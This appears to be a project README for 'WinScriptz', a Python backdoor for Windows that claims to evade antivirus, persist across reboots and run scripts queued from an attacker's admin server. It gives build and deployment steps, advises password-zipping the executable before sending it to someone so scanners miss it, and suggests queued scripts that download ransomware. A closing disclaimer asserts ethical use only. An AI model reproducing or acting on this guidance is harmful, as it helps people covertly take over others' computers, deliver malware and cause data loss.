#                                          WinScriptz

WinScriptz is a Windows backdoor built in Python that remains undetected by antivirus software and allows remote execution of various actions on a target machine.  

## Features  
- **Undetected Execution** – Uses evasion techniques to bypass antivirus detection.  
- **Persistence** – Ensures continued access to the system even after a reboot.  
- **Remote Execution** – Downloads and runs scripts from a centralized admin server.  
- **Custom Scripts** – Supports pre-made and user-defined scripts for executing commands, disabling peripherals, and more.  


WinScriptz works by connecting to an admin server, retrieving queued scripts, and executing them on the remote machine. You can manage and deploy scripts remotely using the `queue-scripts` tool.  

**Note:** Ensure all required libraries are imported into `executor.py` before execution.  

#                                           Installation

Install the python requirements

```sh
python -m pip install -r requirements.txt
```

Start the server

```sh
python app.py
```

Copy your server's HTTP URL and save it inside the `server_url` variable inside `executor.py`

Now, compile the file.

```sh
python compile.py
```

#                                           USAGE

The compiled executable can be found in the `dist` directory, I recommend zipping it with a password before sending it to someone.

Once someone has ran your executable you will start to see numerous requests made to your server, you can then run 

```sh
python queue-scripts.py
```

To queue scripts to the remote computers, you can create your own scripts that can perform numerous tasks such as downloading ransomware or disabling a Windows function.

**Note**: The queue-scripts.py must be ran on the server computer to be able to queue scripts.


#                                           DISCLAIMER

This software is intended **solely for ethical use** and should only be deployed on systems where you have **explicit authorization** from the owner. Unauthorized access, execution, or modification of remote systems without consent is **illegal** and may violate **cybercrime laws** in multiple jurisdictions.

I am **NOT** responsible for any misuse, damage, or legal consequences arising from the use of this tool. **Use it at your own risk** and ensure you have the proper permissions before deploying it.

